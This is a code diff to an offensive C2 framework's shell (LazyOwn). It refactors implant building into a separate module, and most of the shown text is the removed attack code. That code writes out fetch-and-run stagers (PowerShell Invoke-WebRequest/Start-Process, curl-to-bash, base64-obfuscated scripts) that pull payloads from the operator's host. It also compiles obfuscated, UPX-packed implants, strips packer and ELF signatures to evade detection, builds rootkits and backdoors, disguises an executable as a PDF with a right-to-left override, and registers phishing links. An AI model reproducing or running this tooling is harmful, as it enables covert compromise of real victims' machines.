@@ -11540,14 +11540,15 @@ class LazyOwnShell(cmd2.Cmd):
             process.
             - The go artifactory is ofuscated by garble if is installed
         """
+        from modules.c2_builder import C2Builder
 
         use_tunnel = False
+        choice = None
         if line:
             args = line.split()
             num_args = len(args)
             if num_args >= 1:
                 line = args[0]
-                choice = None
                 if num_args == 2:
                     potential_choice = args[1]
                     if potential_choice in ['1', '2', '3', '4', '5', '6', '7']:
@@ -11569,7 +11570,6 @@ class LazyOwnShell(cmd2.Cmd):
                     else:
                         print_error("Invalid tunnel option. Use '1' or '0'.")
                         return
-
             else:
                 print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
                 return
@@ -11577,495 +11577,28 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
             return
 
-        rhost = self.params["rhost"]
-        lport_param = str(self.params["c2_port"])
-
-        if use_tunnel:
-            cmd = """
-            link=$(grep -o 'https://[-0-9a-z]*\\.trycloudflare.com' "cf.log")
-            echo "Cloudflare Tunnel URL: $link"
-            """.replace("            ", "")
-            os.system(cmd)
-            lhost = input("Enter your Cloudflare tunnel subdomain (e.g., yoursubdomain.trycloudflare.com): ").strip()
-            lport = "443"
-        else:
-            lhost = self.params["lhost"]
-            lport = lport_param
-
-        rport = str(self.params["rport"])
-        listener = str(self.params["listener"])
-        sleep = str(self.params["sleep"])
-        path = os.getcwd()
-        file = f"{path}/modules/run"
-        wfile = f"{path}/sessions/win/lazybot.ps1"
-        bfile = f"{path}/modules/run.bat"
-        filek = f"{path}/modules/backdoor/backdoor.c"
-        files = f"{path}/modules/backdoor/server.c"
-        cfiles = f"{path}/modules/rootkit/mr.c"
-        cwfiles = f"{path}/modules/win_rootkit/win_ring3_rootkit.c"
-        mrhyde = f"{path}/modules/win_rootkit/mrhyde.c"
-        rootkit = f"{path}/sessions/mrhyde.so"
-        rootkit_c = f"{path}/modules/rootkit/mrhyde.c"
-        file_evil = f"{path}/modules/evilhttprev.sh"
-        filer = f"{path}/modules/r.sh"
-        gofile = f"{path}/sessions/implant/implant_crypt.go"
-        #gofile_ws = f"{path}/sessions/implant/implant_rust.rs"
-        payload_sh = f"{path}/sessions/lin/payload.sh"
-        gofile2 = f"{path}/sessions/implant/listener.go"
-        #gofile3 = f"{path}/sessions/implant/server.go"
-        gofile4 = f"{path}/sessions/implant/monrevlin.go"
-        #server_go = f"{path}/sessions/server.go"
-        monrevlin = f"{path}/sessions/monrevlin.go"
-        implantgo = f"{path}/sessions/{line}"
-        #implantgo_ws = f"{path}/sessions/ws_{line}"
-        implantgo2 = f"{path}/sessions/l_{line}"
-        implant_config_json = f"{path}/sessions/implant_config_{line}.json"
-        maleable = self.params["c2_maleable_route"]
-        self.c2_url = f"https://{lhost}:{lport}"
-        self.c2_clientid = line.strip()
-        USER = c2_user
-        PASS = c2_pass
-        self.c2_auth = (USER, PASS)
-        random_bytes = os.urandom(100)
-        base64_encoded = base64.b64encode(random_bytes)
-        user_agent_win = self.params["user_agent_win"]
-        user_agent_lin = self.params["user_agent_lin"]
-        user_agent_1 = self.params["user_agent_1"]
-        user_agent_2 = self.params["user_agent_2"]
-        user_agent_3 = self.params["user_agent_3"]
-        url_trafic_1 = self.params["url_trafic_1"]
-        url_trafic_2 = self.params["url_trafic_2"]
-        url_trafic_3 = self.params["url_trafic_3"]
-        gocompiler = "go build"
-        stealth = "True"
-        random_string = base64_encoded.decode('utf-8')[:12]
-        working_dir = f"{path}/sessions/"
-
-        if not is_binary_present("garble"):
-            cmd_garble = "go install github.com/burrowers/garble@latest"
-            self.cmd(cmd_garble)
-        else:
-            gocompiler = "garble -literals -tiny build "
-
-        if not choice:
-            choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4, android 5, IOS 6, WebAssembly 7 (default 1) : ") or '1'
-
-        if choice == '1':
-            payload = f"powershell -c \"Invoke-WebRequest 'http://{lhost}/stub.exe' -OutFile 'stub.exe'; Start-Process 'stub.exe'\""
-            print_msg(payload)
-            self.onecmd(f"encodewinbase64 {payload}")
-            platform = "windows"
-            user_agent = user_agent_win
-        elif choice == '2':
-            payload = f"""curl http://{lhost}/stub -o /tmp/stub && \
-            [ -s /tmp/stub ] && \
-            chmod +x /tmp/stub && \
-            /tmp/stub""".replace("            ","")
-            utf8_encoded = payload.encode("utf-8")
-            base64_encoded = base64.b64encode(utf8_encoded).decode('utf-8')
-            cmd = f"echo '{base64_encoded}' | base64 -d | bash"
-            copy2clip(cmd)
-            platform = "linux"
-            user_agent = user_agent_lin
-        elif choice == '3':
-            payload = f"powershell iwr -uri  http://{lhost}/batrat.bat -OutFile batrat.bat ; .\\batrat.bat"
-            copy2clip(payload)
-            platform = "windows"
-            user_agent = user_agent_win
-        elif choice == '4':
-            payload = f"curl http://{lhost}/r -o r && sh r"
-            copy2clip(payload)
-            platform = "darwin"
-            user_agent = user_agent_win
-        elif choice == '5':
-            payload = f"curl http://{lhost}/r -o r && sh r"
-            copy2clip(payload)
-            platform = "android"
-            user_agent = user_agent_lin
-        elif choice == '6':
-            payload = f"curl http://{lhost}/r -o r && sh r"
-            copy2clip(payload)
-            platform = "ios"
-            user_agent = user_agent_lin
-
-        elif choice == '7':
-            payload = f"curl http://{lhost}/r -o r && sh r"
-            copy2clip(payload)
-            platform = "webassembly"
-            user_agent = user_agent_lin
-        if not check_lhost(lhost):
+        builder = C2Builder(
+            params=self.params,
+            sessions_dir=self.sessions_dir,
+            cmd_fn=self.cmd,
+            onecmd_fn=self.onecmd,
+            toastr_fn=self.display_toastr,
+            c2_user=c2_user,
+            c2_pass=c2_pass,
+        )
+        result = builder.run(line, choice, use_tunnel)
+        if not result:
             return
 
-        if not check_lport(lport):
-            return
+        self.c2_url = result["c2_url"]
+        self.c2_clientid = result["c2_clientid"]
+        self.c2_auth = result["c2_auth"]
+        lport = result["lport"]
+        platform = result["platform"]
+        binary = result["binary"]
+        server = result["server_cmd"]
 
-
-        if not is_exist(file):
-            return
-        with open(cwfiles, 'r') as f:
-            cwcontent = f.read()
-
-        with open(file, 'r') as f:
-            content = f.read()
-
-        with open(payload_sh, 'r') as f:
-            payload_content = f.read()
-
-        with open(mrhyde, 'r') as f:
-            mrhyde_content = f.read()
-
-        with open(rootkit_c, 'r') as f:
-            rootkit_content = f.read()
-
-        with open(cfiles, 'r') as f:
-            content_mon = f.read()
-
-        if not is_exist(wfile):
-            return
-        with open(wfile, 'r') as f:
-            wcontent = f.read()
-
-        with open(bfile, 'r') as f:
-            bcontent = f.read()
-
-        with open(file_evil, 'r') as f:
-            evil_content = f.read()
-        content_mon = content_mon.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
-        cwcontent = cwcontent.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
-        bcontent = bcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent)
-        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent)
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{sleep}", sleep)
-        evil_content = evil_content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost).replace("{listener}", listener)
-        payload_content = payload_content.replace("{line}", line).replace("{lhost}", lhost)
-        rootkit_content = rootkit_content.replace("{line}", line)
-        mrhyde_content = mrhyde_content.replace("{line}", line).replace("{lhost}", lhost)
-        server = f"python3 -W ignore lazyc2.py {lport} {USER} {PASS}"
-        with open(f"{path}/sessions/key.aes", 'rb') as f:
-            AES_KEY = f.read()
-
-        with open(f"{path}/sessions/mrhyde.c", 'w+') as f:
-            f.write(rootkit_content)
-        with open(f"{path}/sessions/mrhydew.c", 'w+') as f:
-            f.write(mrhyde_content)
-
-        with open("sessions/payload.sh", 'w+') as f:
-            f.write(payload_content)
-        with open("sessions/wmr.c", 'w+') as f:
-            f.write(cwcontent)
-
-        with open("sessions/mr.c", 'w+') as f:
-            f.write(content_mon)
-
-        with open("sessions/r", 'w+') as f:
-            f.write(content)
-
-        with open("sessions/w", 'w+') as f:
-            f.write(wcontent)
-
-        with open("sessions/ratbat.bat", 'w+') as f:
-            f.write(bcontent)
-
-
-        with open(filek, 'r') as f:
-            content = f.read()
-
-        content = content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
-        with open("sessions/b.c", 'w+') as f:
-            f.write(content)
-
-        with open(files, 'r') as f:
-            content = f.read()
-
-        with open(f"sessions/listener_{line}.sh", 'w+') as f:
-            f.write(evil_content)
-
-        print_msg(f"curl -o l_{line} http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &")
-
-        content = content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", rhost)
-        with open("sessions/server.c", 'w+') as f:
-            f.write(content)
-        with open(filer, 'r') as f:
-            contentr = f.read()
-
-        contentr = contentr.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
-        with open("sessions/r.sh", 'w+') as f:
-            f.write(contentr)
-
-        with open(gofile, 'r') as f:
-            content = f.read()
-
-        with open(gofile2, 'r') as f:
-            lcontent = f.read()
-
-        #with open(gofile3, 'r') as f:
-        #    lateral_content = f.read()
-
-        with open(gofile4, 'r') as f:
-            monrevlin_content = f.read()
-
-        AES_KEY_hex = AES_KEY.hex()
-
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth).replace('{user_agent_1}', user_agent_1).replace('{user_agent_2}', user_agent_2).replace('{user_agent_3}', user_agent_3).replace('{url_trafic_1}', url_trafic_1).replace('{url_trafic_2}', url_trafic_2).replace('{url_trafic_3}', url_trafic_3)
-        #content_ws = content_ws.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)
-
-        monrevlin_content = monrevlin_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
-        #lateral_content = lateral_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
-        lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
-        implant_go = "main.go"
-        implant_go2 = implantgo + "_l.go"
-        #implant_go_ws = implantgo_ws + ".go"
-        if platform == "windows":
-            implantgo += ".exe"
-            implantgo2 += "_l.exe"
-            #implantgo_ws += ".exe"
-        beacon = f"sessions/{implant_go}"
-        with open(beacon, 'w+') as f:
-            f.write(content)
-
-        #with open(implant_go_ws, 'w+') as f:
-        #    f.write(content_ws)
-
-        with open(f"{implant_go2}", 'w+') as f:
-            f.write(lcontent)
-
-        #with open(f"{server_go}", 'w+') as f:
-        #    f.write(lateral_content)
-
-        with open(f"{monrevlin}", 'w+') as f:
-            f.write(monrevlin_content)
-        cmd = "cd sessions ; rm go.mod ; go mod init main ; go mod tidy ; cp implant/loader_*.go . ; go get golang.org/x/sys/windows"
-        self.cmd(cmd)
-        if platform == "linux":
-            loader = "loader_linux.go"
-            binary = line
-            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
-            #compile_command_ws = f"cd sessions && CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            #compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
-            compile_command4 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/monrevlin {monrevlin}"
-            command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/mr.c -lpthread  -lssl -lcrypto"
-            command_rootkit = f"gcc -fPIC -shared -o {rootkit} -ldl {path}/sessions/mrhyde.c"
-            cplib = 'cp /lib/x86_64-linux-gnu/libc.so.6 sessions/ && cp /lib64/ld-linux-x86-64.so.2 sessions/'
-            self.cmd(command_rootkit)
-            self.cmd(command_mon)
-            self.cmd(compile_command)
-            self.cmd(compile_command2)
-            #self.cmd(compile_command3)
-            self.cmd(compile_command4)
-            #self.cmd(compile_command_ws)
-
-            self.cmd(cplib)
-            self.onecmd(f"service {line}")
-            self.onecmd(f"service l_{line}")
-            ofuscate = f"cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
-            self.cmd(ofuscate)
-            curl_payload = f"curl -o payload.sh http://{lhost}/payload.sh ; chmod +x payload.sh ; ./payload.sh "
-            print_msg(curl_payload)
-            upx = f"upx {self.sessions_dir}/{binary}"
-            self.cmd(upx)
-            upx = f"upx {self.sessions_dir}/monrev"
-            self.cmd(upx)
-            cmd_anti_upx = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "'+line+'"'
-            cmd_ant_elf = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "'+line+'"'
-            self.cmd(cmd_anti_upx)
-            self.cmd(cmd_ant_elf)
-            cmd_anti_upx = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "monrev"'
-            cmd_ant_elf = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "monrev"'
-            self.cmd(cmd_anti_upx)
-            self.cmd(cmd_ant_elf)
-            with open("sessions/implant/stub_lin.c", 'r') as f:
-                stub = f.read()
-                f.close()
-            
-            stub = stub.replace("{lhost}", lhost)
-            with open("sessions/stub.c", 'w+') as f:
-                f.write(stub)
-                f.close()
-            command_stub = f"gcc -o sessions/stub sessions/stub.c  -lcurl && upx sessions/stub"
-            self.cmd(command_stub)
-
-        elif platform == "windows":
-            binary = f"{line}.exe"
-            loader = "loader_windows.go"
-            tool_to_check = "rsrc"
-            if check_go_tool_installed(tool_to_check):
-                print_msg(f"Tool '{tool_to_check}' is installed.")
-            else:
-                print_msg(f"Installing tool '{tool_to_check}'.")
-                install = "go install github.com/akavel/rsrc@latest"
-                self.cmd(install)
-            icon_command = f"rsrc -ico static/pdf.ico -o sessions/icon.syso"
-            self.cmd(icon_command)
-
-            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w -H=windowsgui\" -o {implantgo} {implant_go} {loader}"
-            #compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            #compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
-            compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
-            command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
-            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`\"\"")
-            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\"")
-            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/b{line}.exe -OutFile b{line}.exe ; .\\b{line}.exe`\"\"")
-
-            with open("sessions/implant/stub.c", 'r') as f:
-                stub = f.read()
-                f.close()
-            
-            stub = stub.replace("{lhost}", lhost)
-            with open("sessions/stub.c", 'w+') as f:
-                f.write(stub)
-                f.close()
-            command_stub = f"x86_64-w64-mingw32-gcc -o sessions/stub.exe sessions/stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 && upx sessions/stub.exe"
-            self.cmd(command_stub)
-
-            
-            self.cmd(compile_cw)
-            self.cmd(command_mrhyde)
-            self.cmd(compile_command)
-            self.cmd(compile_command2)
-            #self.cmd(compile_command3)
-            #self.cmd(compile_command_ws_win)
-            upx = f"upx {self.sessions_dir}/{binary}"
-            self.cmd(upx)
-            upx = f"upx {self.sessions_dir}/b{binary}"
-            self.cmd(upx)
-            new_binary = f"{self.sessions_dir}/{binary}"
-            newname = (new_binary.split('.')[0] + u'\u202e' + ".pdfx"[::-1]  + new_binary.split('.')[1]).encode('utf-8')
-            
-            print_msg("New Camuflage File " + str(newname))
-            shutil.copy(file, newname)
-
-        elif platform == "darwin":
-            binary = line
-            loader = "loader_linux.go"
-            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=darwin CC=x86_64-apple-darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            #compile_command3 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
-            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
-            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
-
-            self.cmd(compile_command)
-            self.cmd(compile_command2)
-            #self.cmd(compile_command3)
-            upx = f"upx {self.sessions_dir}/{binary}"
-            self.cmd(upx)
-
-        elif platform == "android":
-            binary = line
-            loader = "loader_linux.go"
-            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            #compile_command3 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
-            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
-            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
-
-            self.cmd(compile_command)
-            self.cmd(compile_command2)
-            #self.cmd(compile_command3)
-            upx = f"upx {self.sessions_dir}/{binary}"
-            self.cmd(upx)
-
-        elif platform == "ios":
-            binary = line
-            loader = "loader_linux.go"
-            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1  CC=x86_64-apple-darwin GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
-            compile_command2 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            #compile_command3 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
-            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
-            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
-
-            self.cmd(compile_command)
-            self.cmd(compile_command2)
-            #self.cmd(compile_command3)
-            upx = f"upx {self.sessions_dir}/{binary}"
-            self.cmd(upx)
-
-        elif platform == "webassembly":
-            binary = line
-            loader = "loader_linux.go"
-            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            #compile_command3 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
-            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
-            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
-
-            self.cmd(compile_command)
-            self.cmd(compile_command2)
-            #self.cmd(compile_command3)
-            upx = f"upx {self.sessions_dir}/{binary}"
-            self.cmd(upx)
-
-        encbeacon = f"""
-        python3 -c "
-        import base64
-        with open('sessions/{binary}', 'rb') as f:
-            data = f.read()
-            xor_data = bytes([b ^ 0x33 for b in data])
-            b64_data = base64.b64encode(xor_data)
-        with open('sessions/beacon.enc', 'wb') as f:
-            f.write(b64_data)
-        "
-        """.replace("        ","")
-        self.display_toastr(f"Executing... {encbeacon}", type="info")
-        os.system(encbeacon)
-        print_msg(f"Go agent {implantgo} compiled successfully.")
-
-
-        md5 = f"md5sum {self.sessions_dir}/{binary}"
-        md5sum = self.cmd(md5)
-
-        now = datetime.now()
-        now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-        json_content = {
-            "id": random_string,
-            "name": line,
-            "binary": f"{path}/sessions/{binary}",
-            "url_binary": f"http://{lhost}/{binary}",
-            "os_id": choice,
-            "os": platform,
-            "rhost": rhost,
-            "log": f"{line}.log",
-            "user_agent": user_agent,
-            "maleable_route": maleable,
-            "url": self.c2_url,
-            "sleep": sleep,
-            "username": USER,
-            "password": PASS,
-            "working_path": working_dir,
-            "payload": payload,
-            "created": now_str
-        }
-        with open(f"{implant_config_json}", 'w+') as f:
-            json.dump(json_content, f, indent=4)
-
-        json_file = self.sessions_dir + "/phishing/campaigns/short_urls.json"
-
-        if not os.path.exists(json_file):
-            short_urls = {}
-        else:
-            with open(json_file, 'r') as f:
-                short_urls = json.load(f)
-
-        if line in short_urls:
-            print_warn(f"Entry '{line}' already exists in short urls")
-
-
-        new_entry = {
-            line: {
-                "original_url": f"https://{lhost}/s/{binary}",
-                "active": True,
-                "created_at": datetime.now().isoformat()
-            }
-        }
-
-        short_urls.update(new_entry)
-        with open(json_file, 'w') as f:
-            json.dump(short_urls, f, indent=2)
-
-        print_msg(f"Created new entry for '{line}' in shorts urls")
-
-        self.onecmd("create_session_json")
-        if is_port_in_use(int(lport)):
+        if result["port_in_use"]:
             command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
             self.cmd(command)
             print_msg(f"Agent {line}/{platform} Crafted.")
@@ -12074,10 +11607,8 @@ class LazyOwnShell(cmd2.Cmd):
             if choice == 'yes':
                 command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
                 self.cmd(command)
-                print_msg("Username: LazyOwn")
-                print_msg("Password: LazyOwn")
+                print_msg("Credentials stored in sessions/credentials_c2.txt")
                 self.cmd(server)
-
                 print_warn(f"Shutdown Server C&C at port:{RED} {lport}")
 
         return
